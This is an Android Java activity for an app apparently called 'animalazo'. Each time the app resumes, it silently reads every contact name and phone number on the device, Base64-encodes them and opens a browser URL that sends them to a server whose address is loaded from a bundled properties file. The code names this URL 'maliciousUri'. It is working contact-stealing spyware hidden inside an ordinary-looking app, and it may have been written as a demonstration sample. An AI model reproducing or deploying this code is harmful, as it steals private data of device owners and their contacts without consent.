package com.example.animalazo;

import java.util.ArrayList;
import java.util.Properties;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Base64;
import android.view.Menu;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
//		ArrayList<String> listContacts = getContactsStrings();
//
//		setContentView(R.layout.activity_main);
//		//TextView textView = (TextView) findViewById(R.id.textView1);
//		String contactsCollapsed = "";
//		for (String contact : listContacts) {
//			contactsCollapsed += "|" + contact;
//		}
//		//		textView.setText(contactsCollapsed);
//
//		sendContactsThroughBrowser(contactsCollapsed);
	}

	@Override
	protected void onResume() {
		// TODO Auto-generated method stub
		super.onResume();
		ArrayList<String> listContacts = getContactsStrings();

		setContentView(R.layout.activity_main);
		//TextView textView = (TextView) findViewById(R.id.textView1);
		String contactsCollapsed = "";
		for (String contact : listContacts) {
			contactsCollapsed += "|" + contact;
		}
		//		textView.setText(contactsCollapsed);

		sendContactsThroughBrowser(contactsCollapsed);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);

		return true;
	}

	public void sendContactsThroughBrowser(String contactsCollapsed) {
		Uri maliciousUri = Uri.parse("http://" + this.getAddress() + "/" + Base64.encodeToString(contactsCollapsed.getBytes(),Base64.NO_WRAP));
		Intent launchBrowser = new Intent(Intent.ACTION_VIEW, maliciousUri);
		startActivity(launchBrowser);
	}

	public ArrayList<String> getContactsStrings(){
		ArrayList<String> contacts = new ArrayList<String>();

		Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String[] projection    = new String[] {ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
				ContactsContract.CommonDataKinds.Phone.NUMBER};

		Cursor people = getContentResolver().query(uri, projection, null, null, null);

		int indexName = people.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
		int indexNumber = people.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

		people.moveToFirst();
		do {
			String name   = people.getString(indexName);
			String number = people.getString(indexNumber);
			contacts.add(name + ";" + number);
		} while (people.moveToNext());

		return contacts;
	}
	
	private String getAddress() {
		try {
			Properties properties = new Properties();
			properties.load(this.getAssets().open("server.properties"));
			return properties.getProperty("address");
		} catch (Exception e) {
			return null;
		}
	}
	
}
